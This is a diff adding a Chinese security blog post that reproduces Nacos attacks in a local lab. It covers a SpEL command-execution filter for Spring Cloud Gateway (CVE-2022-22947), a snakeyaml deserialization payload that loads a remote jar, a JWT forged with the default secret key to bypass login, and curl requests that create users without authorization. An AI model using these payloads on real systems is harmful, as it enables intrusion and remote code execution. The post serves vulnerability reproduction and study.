@@ -1,0 +1,828 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Nacos在实战中碰到了很多，不仅仅是未授权或者登录饶过，其实可以通过配合其它利用方式达到RCE的效果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos相关漏洞复现">
+<meta property="og:url" content="https://c47sh4rk.github.io/2023/05/29/Nacos%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="Nacos在实战中碰到了很多，不仅仅是未授权或者登录饶过，其实可以通过配合其它利用方式达到RCE的效果">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529111823007.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112324543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112138895.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112941641.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529120523013.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529120549748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529151053495-20230529151140940.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529122624187.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529122805001.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123116428.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123245307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123320571.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150007041.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150122608.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150102933.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529151053495.png">
+<meta property="article:published_time" content="2023-05-29T03:12:05.000Z">
+<meta property="article:modified_time" content="2023-06-02T01:53:25.000Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="实战">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529111823007.png">
+  
+  
+  
+  <title>Nacos相关漏洞复现 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Nacos相关漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-29 11:12" pubdate>
+          2023年5月29日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          82 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Nacos相关漏洞复现</h1>
+            
+            <div class="markdown-body">
+              
+              <h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>这里用到的是<code>B0rn2d</code>师傅的<a target="_blank" rel="noopener" href="https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos">环境</a>，后续的很多关于RCE的利用也是参考他的文章。</p>
+<p>实际上就是引入Nacos依赖，连接到Nacos服务。</p>
+<p>Nacos可以在Github直接下载Release版本：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.1.0%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%90%8E%E8%BF%90">https://github.com/alibaba/nacos/releases/tag/2.1.0，解压后运</a> 行 <code>sh startup.sh -m standalone</code>，访问 localhost:8848&#x2F;nacos 即可使用默认密码nacos&#x2F;nacos登录。</p>
+<p>所有环境都在jdk1.8下运行，不然可能有莫名的报错</p>
+<p>运行存在漏洞的Gateway项目，在项目的配置文件bootstrap.yml中，配置了连接Nacos的关键项</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529111823007.png" srcset="/img/loading.gif" lazyload alt="image-20230529111823007"></p>
+<p>其中<code>spring.cloud.nacos.config</code>下，name代表的是要在nacos中创建的配置文件的DataID，file-extension则是nacos中所创建的配置文件的格式，group则代表nacos中配置文件对应的组，而server-addr则是nacos的访问地址。</p>
+<p>在nacos中创建对应的配置文件如下：</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112324543.png" srcset="/img/loading.gif" lazyload alt="image-20230529112324543"></p>
+<p>如果运行正常，则spring-cloud-gateway项目会从nacos中动态的去获取这个配置文件，然后将内容进行即时的更新，运行项目后，可以在nacos中的监听查询功能检查是否正常连接</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112138895.png" srcset="/img/loading.gif" lazyload alt="image-20230529112138895"></p>
+<p>通过配置一条简单的路由，来测试运行效果，在刚才创建的配置文件中，点击修改配置如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">exam</span><br>          <span class="hljs-attr">order:</span> <span class="hljs-number">0</span><br>          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://service-provider</span><br>          <span class="hljs-attr">predicates:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/echo/**</span><br></code></pre></td></tr></table></figure>
+
+<p>发布后，gateway应用会成功刷新配置，此时若访问&#x2F;echo&#x2F;**路径，则nacos会将请求转发到service-provider中</p>
+<p>这里请求报503是正常的，因为找不到这个路由</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529112941641.png" srcset="/img/loading.gif" lazyload alt="image-20230529112941641"></p>
+<p>至此环境就配置通了。</p>
+<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h3><p>如果拿到了一个<code>Nacos</code>权限，如何进行利用呢？</p>
+<h4 id="Nacos配合ActuatorRCE"><a href="#Nacos配合ActuatorRCE" class="headerlink" title="Nacos配合ActuatorRCE"></a>Nacos配合ActuatorRCE</h4><p>进入nacos管理页面，翻阅配置，寻找<code>Spring Cloud Gateway</code>相关的配置，监听的服务器基本可以确定运行了<code>Spring Cloud Gateway</code>的服务器，可以在配置文件的更多中点击监听查询：</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529120523013.png" srcset="/img/loading.gif" lazyload alt="image-20230529120523013"></p>
+<p>就可以直接看到监听的服务器了</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529120549748.png" srcset="/img/loading.gif" lazyload alt="image-20230529120549748"></p>
+<p>如果应用注册到了服务中的话，那么通过服务详情里的IP，再对比上面监听查询中的IP，就可以定位到监听某个配置文件的应用的具体端口了</p>
+<p>如果打进了内网，发现<code>Nacos</code>的时候，就可以用这个方法定位内网中的其他应用，接下来就是找<code>Spring Cloud Gateway</code>应用以及它的Nacos配置文件，和利用<code>CVE-2022-22947</code>来进行攻击</p>
+<p>回到之前的配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改，改为以下内容：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">exam</span><br>          <span class="hljs-attr">order:</span> <span class="hljs-number">0</span><br>          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://service-provider</span><br>          <span class="hljs-attr">predicates:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/echo/**</span><br>          <span class="hljs-attr">filters:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">AddResponseHeader</span><br>              <span class="hljs-attr">args:</span><br>                <span class="hljs-attr">name:</span> <span class="hljs-string">result</span><br>                <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;id&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里增加了一个filters字段，并写入POC，但这里需要注意的坑有两点：</p>
+<ol>
+<li>需要修改原POC，将字符串输入结果使用replace()将\n以及\r符号替换为空，否则会提示报错Header中不能包含该字符导致利用失败</li>
+<li>在YAML配置文件中，SpEL表达式必须要用双引号括起来，但POC原本就带有双引号，会导致识别冲突，所以将POC内所有的双引号改为单引号，外面在用双引号括起来</li>
+</ol>
+<p>完成后对配置文件进行发布，然后尝试访问<code>http://127.0.0.1:8888/echo/123</code>，发现成功回显了命令执行的结果：</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529151053495-20230529151140940.png" srcset="/img/loading.gif" lazyload alt="image-20230529151053495"></p>
+<h4 id="snakeyaml反序列化攻击"><a href="#snakeyaml反序列化攻击" class="headerlink" title="snakeyaml反序列化攻击"></a>snakeyaml反序列化攻击</h4><p>payload:（EvilScript.java）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngine;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineFactory;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> threedr3am</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilScript</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ScriptEngineFactory</span> &#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilScript</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;touch /tmp/pwn&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEngineName</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEngineVersion</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getExtensions</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getMimeTypes</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNames</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLanguageName</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLanguageVersion</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getParameter</span><span class="hljs-params">(String key)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMethodCallSyntax</span><span class="hljs-params">(String obj, String m, String... args)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getOutputStatement</span><span class="hljs-params">(String toDisplay)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProgram</span><span class="hljs-params">(String... statements)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> ScriptEngine <span class="hljs-title function_">getScriptEngine</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译并且打包成jar</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac EvilScript.java<br><span class="hljs-built_in">mkdir</span> -p META-INF/services/<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;EvilScript&#x27;</span> &gt; META-INF/services/javax.script.ScriptEngineFactory<br>jar -cvf EvilScript.jar EvilScript.class META-INF<br></code></pre></td></tr></table></figure>
+
+<p>启一个http文件服务器</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span>/EvilScript.jar<br></code></pre></td></tr></table></figure>
+
+<p>绕过认证后，去修改yaml配置文件</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">server:<br>  port: <span class="hljs-number">8080</span><br>evil: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[<br>!!java.net.URL [<span class="hljs-string">&quot;http://127.0.0.1:80/EvilScript.jar&quot;</span>]]]]<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-登录绕过"><a href="#3-登录绕过" class="headerlink" title="3. 登录绕过"></a>3. 登录绕过</h3><p>对于<code>nacos</code>，如果默认的弱口令无法进入后台，在低版本下还存在其他的绕过方式</p>
+<h4 id="CNVD-2023-17316"><a href="#CNVD-2023-17316" class="headerlink" title="CNVD-2023-17316"></a>CNVD-2023-17316</h4><p>先讲讲如何简单复现这个漏洞</p>
+<p>这里我选择偷懒，拿之前在实战的报告当数据包和截图了</p>
+<ol>
+<li>生成JWT token</li>
+</ol>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">header :</span><br>&#123;<br>  <span class="hljs-attr">&quot;alg&quot;:</span> <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-attr">&quot;typ&quot;:</span> <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><span class="hljs-attr">payload:</span> <br>&#123;<br>  <span class="hljs-attr">&quot;sub&quot;:</span> <span class="hljs-string">&quot;nacos&quot;</span>,<br>  <span class="hljs-attr">&quot;exp&quot;:</span> <span class="hljs-number">1684393327</span>    <span class="hljs-string">//</span> <span class="hljs-string">时间戳，比这个大就会返回正确token</span><br>&#125;<br><span class="hljs-attr">VERIFY SIGNATURE:</span> <span class="hljs-string">HMACSHA256(</span><br>  <span class="hljs-string">base64UrlEncode(header)</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-string">+</span><br>  <span class="hljs-string">base64UrlEncode(payload),</span><br><span class="hljs-string">SecretKey012345678901234567890123456789012345678901234567890123456789</span><br><span class="hljs-string">)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529122624187.png" srcset="/img/loading.gif" lazyload alt="image-20230529122624187"></p>
+<ol start="2">
+<li>构造数据包</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /nacos/v1/auth/users/login <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8848</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Length</span>: <span class="hljs-number">32</span><br><span class="hljs-title class_">Accept</span>: application/json, text/plain, *<span class="hljs-comment">/*</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Origin: http://127.0.0.1:8848</span><br><span class="hljs-comment">Referer: http://127.0.0.1:8848/nacos/</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY4NDM5MzMyN30.OOTD_TIinawZvdgxRTg8BpIqEdE3gZhahxN9Ql0gaWs</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">username=admin&amp;password=admin123</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529122805001.png" srcset="/img/loading.gif" lazyload alt="image-20230529122805001"></p>
+<p>burp抓包后修改Authorization的token值就可以直接进后台了</p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123116428.png" srcset="/img/loading.gif" lazyload alt="image-20230529123116428"></p>
+<h4 id="CVE-2021-29441-x2F-CVE-2021-29442"><a href="#CVE-2021-29441-x2F-CVE-2021-29442" class="headerlink" title="CVE-2021-29441&#x2F;CVE-2021-29442"></a>CVE-2021-29441&#x2F;CVE-2021-29442</h4><p>poc:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># CVE-2021-29441 创建用户</span><br>curl -XPOST <span class="hljs-string">&#x27;http://127.0.0.1:8848/nacos/v1/auth/users?username=test&amp;password=test&#x27;</span><br><span class="hljs-comment"># CVE-2021-29442 bypass 1.4.1</span><br>curl XGET <span class="hljs-string">&#x27;http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529123245307.png" srcset="/img/loading.gif" lazyload alt="image-20230529123245307"></p>
